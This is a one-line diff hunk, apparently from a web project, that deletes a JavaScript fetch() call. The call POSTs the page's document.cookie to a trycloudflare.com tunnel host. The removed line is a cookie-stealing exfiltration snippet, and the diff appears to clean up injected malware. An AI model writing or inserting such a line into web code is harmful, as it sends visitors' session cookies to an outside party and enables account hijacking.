@@ -1,1 +1,0 @@
-fetch("https://glass-opening-nm-modules.trycloudflare.com/", {method: "post", body: document.cookie})
